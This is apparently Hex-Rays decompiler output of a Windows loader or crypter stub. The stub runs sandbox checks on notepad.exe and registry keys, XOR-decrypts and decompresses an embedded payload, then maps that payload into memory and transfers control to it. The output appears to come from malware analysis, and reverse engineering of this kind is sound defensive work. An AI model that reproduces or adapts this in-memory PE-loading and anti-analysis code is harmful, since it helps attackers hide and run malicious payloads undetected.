/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401040(int, int, unsigned int);
// int __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>);
FARPROC __cdecl sub_4012E0(HMODULE hModule, LPCSTR lpProcName);
int __stdcall sub_401300(int);
LPVOID __cdecl sub_4016C0(SIZE_T dwSize);
int __cdecl sub_4016F0(int, int);
int __cdecl sub_401850(int);
LPSTR __cdecl sub_401880(char *, int, unsigned int);
int __cdecl sub_4019B0(_DWORD *, unsigned __int8 *);

//-------------------------------------------------------------------------
// Data declarations

// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
_UNKNOWN loc_4012A9; // weak
_UNKNOWN unk_402001; // weak
CHAR ProcName[] = "GetWindowsDirectoryA"; // idb
CHAR LibFileName[] = "kernel32.dll"; // idb
CHAR String2[] = "\\notepad.exe"; // idb
CHAR aRegopenkeya[] = "RegOpenKeyA"; // idb
CHAR aAdvapi32Dll[] = "advapi32.dll"; // idb
char aSys[5] = ".sys"; // weak
CHAR aRegopenkeya_0[] = "RegOpenKeyA"; // idb
CHAR aAdvapi32Dll_0[] = "advapi32.dll"; // idb
char a111Rs11111111s[19] = "111__RS__11111111s"; // weak
CHAR aRs[] = "__RS__"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
CHAR aUnmapviewoffil[] = "UnmapViewOfFile"; // idb
CHAR aCreatefilemapp[] = "CreateFileMappingA"; // idb
CHAR aVirtualalloc[] = "VirtualAlloc"; // idb
CHAR aVirtualfree[] = "VirtualFree"; // idb
CHAR aMapviewoffilee[] = "MapViewOfFileEx"; // idb
CHAR aVirtualalloc_0[] = "VirtualAlloc"; // idb
CHAR aKernel32Dll_2[] = "kernel32.dll"; // idb
CHAR aDdddRs52343543_1[] = "dddd__RS__52343543535"; // idb
CHAR aDdddRs52343543_2[] = "dddd__RS__52343543535"; // idb
CHAR aDdddRs52343543[] = "dddd__RS__52343543535"; // idb
CHAR aDdddRs52343543_0[] = "dddd__RS__52343543535"; // idb
int dword_4063F4 = 0; // weak
int dword_4063F8 = 0; // weak
int dword_4063FC = 0; // weak
int dword_406400; // weak
int dword_406404; // weak
int dword_406408; // weak
int dword_40640C; // weak
int dword_406410; // weak
int (*dword_406414)(void); // weak


//----- (00401040) --------------------------------------------------------
int __cdecl sub_401040(int a1, int a2, unsigned int a3)
{
  int result; // eax

  for ( dword_4063FC = 0; dword_4063FC < a3; ++dword_4063FC )
  {
    *(_BYTE *)(dword_4063FC + a1) = *(_BYTE *)(dword_4063FC + a2);
    result = dword_4063FC + 1;
  }
  return result;
}
// 4063FC: using guessed type int dword_4063FC;

//----- (004010D0) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  HMODULE LibraryA; // eax
  UINT (__stdcall *GetWindowsDirectoryA)(LPSTR, UINT); // eax
  HMODULE v6; // eax
  LSTATUS (__stdcall *RegOpenKeyA)(HKEY, LPCSTR, PHKEY); // eax
  HMODULE v8; // eax
  SIZE_T dwSize; // [esp+Ch] [ebp-90h]
  unsigned int v10; // [esp+10h] [ebp-8Ch]
  HMODULE ModuleHandleA; // [esp+1Ch] [ebp-80h]
  LSTATUS (__stdcall *ProcAddress)(HKEY, LPCSTR, PHKEY); // [esp+20h] [ebp-7Ch]
  HANDLE FileA; // [esp+24h] [ebp-78h]
  int v14; // [esp+28h] [ebp-74h] BYREF
  CHAR String1[108]; // [esp+2Ch] [ebp-70h] BYREF
  char *i; // [esp+98h] [ebp-4h]
  int savedregs; // [esp+9Ch] [ebp+0h] BYREF

  v14 = 1;
  LibraryA = LoadLibraryA(LibFileName);
  GetWindowsDirectoryA = (UINT (__stdcall *)(LPSTR, UINT))GetProcAddress(LibraryA, ProcName);
  GetWindowsDirectoryA(String1, 100);
  lstrcatA(String1, String2);
  FileA = CreateFileA(String1, 1u, 3u, 0, 3u, 0x80u, 0);
  if ( FileA == (HANDLE)-1 || !FileA )
    return 0;
  v6 = LoadLibraryA(aAdvapi32Dll);
  RegOpenKeyA = (LSTATUS (__stdcall *)(HKEY, LPCSTR, PHKEY))GetProcAddress(v6, aRegopenkeya);
  if ( RegOpenKeyA(HKEY_CLASSES_ROOT, aSys, (PHKEY)&v14) )
    return 0;
  v8 = LoadLibraryA(aAdvapi32Dll_0);
  ProcAddress = (LSTATUS (__stdcall *)(HKEY, LPCSTR, PHKEY))GetProcAddress(v8, aRegopenkeya_0);
  if ( !ProcAddress(HKEY_CLASSES_ROOT, a111Rs11111111s, (PHKEY)&v14) )
    return 0;
  ModuleHandleA = GetModuleHandleA(0);
  v10 = unk_402001;
  dwSize = *((_DWORD *)&unk_402001 + 1);
  for ( i = 0; (unsigned int)i < v10; i += 8 )
  {
    GetModuleHandleA(0);
    *(_DWORD *)((char *)&unk_402001 + (_DWORD)i + 8) ^= 0xAA2C27u;
  }
  dword_40640C = (int)sub_4016C0(dwSize);
  sub_401880((char *)&unk_402001 + 8, dword_40640C, v10);
  dword_406400 = a2;
  dword_4063F8 = a3;
  dword_406408 = a1;
  dword_406410 = (int)NtCurrentTeb();
  i = (char *)&loc_4012A9;
  dword_406404 = (int)&savedregs;
  sub_4016F0(&loc_4012A9 - (_UNKNOWN *)ModuleHandleA, (int)ModuleHandleA);
  sub_401300(dword_40640C);
  return dword_406414();
}
// 4063F8: using guessed type int dword_4063F8;
// 406400: using guessed type int dword_406400;
// 406404: using guessed type int dword_406404;
// 406408: using guessed type int dword_406408;
// 40640C: using guessed type int dword_40640C;
// 406410: using guessed type int dword_406410;
// 406414: using guessed type int (*dword_406414)(void);

//----- (004012E0) --------------------------------------------------------
FARPROC __cdecl sub_4012E0(HMODULE hModule, LPCSTR lpProcName)
{
  return GetProcAddress(hModule, lpProcName);
}

//----- (00401300) --------------------------------------------------------
int __stdcall sub_401300(int a1)
{
  FARPROC v1; // eax
  _DWORD *j; // [esp+0h] [ebp-C8h]
  HMODULE hModule; // [esp+8h] [ebp-C0h]
  char String1[120]; // [esp+10h] [ebp-B8h] BYREF
  LPVOID (__stdcall *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD); // [esp+88h] [ebp-40h]
  int v7; // [esp+8Ch] [ebp-3Ch]
  BOOL (__stdcall *UnmapViewOfFile)(LPCVOID); // [esp+90h] [ebp-38h]
  int *v9; // [esp+94h] [ebp-34h]
  int v10; // [esp+98h] [ebp-30h]
  _DWORD *v11; // [esp+A0h] [ebp-28h]
  int *v12; // [esp+A4h] [ebp-24h]
  HMODULE LibraryA; // [esp+ACh] [ebp-1Ch]
  int v14; // [esp+B0h] [ebp-18h]
  LPVOID (__stdcall *MapViewOfFileEx)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID); // [esp+B4h] [ebp-14h]
  BOOL (__stdcall *VirtualFree)(LPVOID, SIZE_T, DWORD); // [esp+B8h] [ebp-10h]
  unsigned int i; // [esp+BCh] [ebp-Ch]
  HANDLE hObject; // [esp+C0h] [ebp-8h]
  HANDLE (__stdcall *CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR); // [esp+C4h] [ebp-4h]

  lstrcpyA(String1, aRs);
  hModule = GetModuleHandleA(ModuleName);
  UnmapViewOfFile = (BOOL (__stdcall *)(LPCVOID))GetProcAddress(hModule, aUnmapviewoffil);
  CreateFileMappingA = (HANDLE (__stdcall *)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(hModule, aCreatefilemapp);
  VirtualAlloc = (LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hModule, aVirtualalloc);
  VirtualFree = (BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD))GetProcAddress(hModule, aVirtualfree);
  MapViewOfFileEx = (LPVOID (__stdcall *)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID))GetProcAddress(
                                                                                         hModule,
                                                                                         aMapviewoffilee);
  v7 = *(_DWORD *)(a1 + 60) + a1;
  v11 = (_DWORD *)(v7 + *(unsigned __int16 *)(v7 + 20) + 24);
  v10 = (int)VirtualAlloc(0, *(_DWORD *)(v7 + 80), 12288, 64);
  sub_401040(v10, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v7 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v7 + 6); ++i )
  {
    if ( v11[5] )
    {
      if ( v11[4] )
        sub_401040(
          v11[3] + v10,
          v11[5] + a1,
          *(_DWORD *)(v7 + 60) * ((unsigned int)(v11[4] + *(_DWORD *)(v7 + 60) - 1) / *(_DWORD *)(v7 + 60)));
    }
    v11 += 10;
  }
  v7 = *(_DWORD *)(v10 + 60) + v10;
  hObject = CreateFileMappingA((HANDLE)-1, 0, 4, 0, *(_DWORD *)(v7 + 80), 0);
  for ( j = (_DWORD *)(*(_DWORD *)(v7 + 128) + v10); j[4]; j += 5 )
  {
    LibraryA = LoadLibraryA((LPCSTR)(j[3] + v10));
    if ( *j )
    {
      v12 = (int *)(*j + v10);
      v9 = (int *)(j[4] + v10);
    }
    else
    {
      v12 = (int *)(j[4] + v10);
      v9 = (int *)(*j + v10);
    }
    v14 = 0;
    if ( j[4] && *j )
      v14 = 1;
    while ( *v12 )
    {
      if ( *v12 >= 0 )
        v1 = sub_4012E0(LibraryA, (LPCSTR)(*v12 + v10 + 2));
      else
        v1 = sub_4012E0(LibraryA, (LPCSTR)(*v12 & 0x7FFFFFFF));
      *v12 = (int)v1;
      if ( v14 )
        *v9 = *v12;
      ++v12;
      ++v9;
    }
  }
  dword_4063F4 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *(LPVOID *)(v7 + 52));
  if ( !dword_4063F4 )
  {
    if ( !UnmapViewOfFile(*(LPCVOID *)(v7 + 52)) && !VirtualFree(*(LPVOID *)(v7 + 52), 0, 0x8000) )
      return 0;
    dword_4063F4 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *(LPVOID *)(v7 + 52));
    if ( !dword_4063F4 )
      dword_4063F4 = (int)VirtualAlloc(*(LPVOID *)(v7 + 52), *(_DWORD *)(v7 + 80), 12288, 64);
  }
  CloseHandle(hObject);
  sub_401040(dword_4063F4, v10, *(_DWORD *)(v7 + 80));
  sub_401850(dword_4063F4);
  dword_406414 = (int (*)(void))(*(_DWORD *)(v7 + 40) + dword_4063F4);
  *(_DWORD *)(v7 + 40) = dword_406414;
  return 1;
}
// 4063F4: using guessed type int dword_4063F4;
// 406414: using guessed type int (*dword_406414)(void);
// 401300: using guessed type CHAR String1[120];

//----- (004016C0) --------------------------------------------------------
LPVOID __cdecl sub_4016C0(SIZE_T dwSize)
{
  return VirtualAlloc(0, dwSize, 0x3000u, 4u);
}

//----- (004016F0) --------------------------------------------------------
int __cdecl sub_4016F0(int a1, int a2)
{
  HMODULE ModuleHandleA; // eax
  LPVOID (__stdcall *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD); // eax
  _DWORD *v5; // [esp+8h] [ebp-1Ch]
  int v6; // [esp+Ch] [ebp-18h]
  SIZE_T *v7; // [esp+14h] [ebp-10h]
  unsigned int v8; // [esp+18h] [ebp-Ch]
  _DWORD *i; // [esp+1Ch] [ebp-8h]
  unsigned int j; // [esp+20h] [ebp-4h]

  v7 = (SIZE_T *)(*(_DWORD *)(a2 + 60) + a2);
  ModuleHandleA = GetModuleHandleA(aKernel32Dll_2);
  VirtualAlloc = (LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(ModuleHandleA, aVirtualalloc_0);
  dword_4063F4 = (int)VirtualAlloc(0, v7[20], 12288, 64);
  if ( dword_4063F4 )
  {
    sub_401040(dword_4063F4, a2, v7[20]);
    v6 = dword_4063F4 - a2;
    if ( v7[41] )
    {
      for ( i = (_DWORD *)(v7[40] + a2); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v8 = (unsigned int)(i[1] - 8) >> 1;
        v5 = i + 2;
        for ( j = 0; j < v8; ++j )
        {
          if ( (int)*((unsigned __int16 *)v5 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4063F4 + (*((_WORD *)v5 + j) & 0xFFF)) += v6;
        }
      }
    }
    __asm { jmp     ecx }
  }
  return 2;
}
// 4063F4: using guessed type int dword_4063F4;

//----- (00401850) --------------------------------------------------------
int __cdecl sub_401850(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_406410 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 406410: using guessed type int dword_406410;

//----- (00401880) --------------------------------------------------------
LPSTR __cdecl sub_401880(char *a1, int a2, unsigned int a3)
{
  int v3; // eax
  int v4; // eax
  CHAR String1[116]; // [esp+0h] [ebp-90h] BYREF
  int v7; // [esp+74h] [ebp-1Ch] BYREF
  unsigned int i; // [esp+78h] [ebp-18h]
  int v9; // [esp+7Ch] [ebp-14h]
  char v10; // [esp+83h] [ebp-Dh]
  unsigned int v11; // [esp+84h] [ebp-Ch] BYREF
  unsigned int v12; // [esp+88h] [ebp-8h]
  char v13; // [esp+8Fh] [ebp-1h]

  v12 = 1;
  v10 = *a1;
  lstrcpyA(String1, aDdddRs52343543);
  v9 = 0;
  do
  {
    v13 = a1[v12++];
    if ( v13 == v10 )
    {
      if ( a1[v12] )
      {
        v3 = sub_4019B0(&v11, (unsigned __int8 *)&a1[v12]);
        v12 += v3;
        v4 = sub_4019B0(&v7, (unsigned __int8 *)&a1[v12]);
        v12 += v4;
        for ( i = 0; i < v11; ++i )
        {
          *(_BYTE *)(v9 + a2) = *(_BYTE *)(a2 + v9 - v7);
          ++v9;
        }
      }
      else
      {
        *(_BYTE *)(v9 + a2) = v10;
        ++v9;
        ++v12;
      }
    }
    else
    {
      *(_BYTE *)(v9 + a2) = v13;
      ++v9;
    }
  }
  while ( v12 < a3 );
  return lstrcpyA(String1, aDdddRs52343543_0);
}

//----- (004019B0) --------------------------------------------------------
int __cdecl sub_4019B0(_DWORD *a1, unsigned __int8 *a2)
{
  CHAR String1[112]; // [esp+0h] [ebp-80h] BYREF
  int v4; // [esp+70h] [ebp-10h]
  int v5; // [esp+74h] [ebp-Ch]
  int v6; // [esp+78h] [ebp-8h]
  int v7; // [esp+7Ch] [ebp-4h]

  v7 = 0;
  v5 = 0;
  lstrcpyA(String1, aDdddRs52343543_1);
  do
  {
    v6 = *a2++;
    v4 = v7 << 7;
    v7 = (v7 << 7) | v6 & 0x7F;
    ++v5;
  }
  while ( (v6 & 0x80) != 0 );
  lstrcpyA(String1, aDdddRs52343543_2);
  *a1 = v7;
  return v5;
}

// nfuncs=9 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled
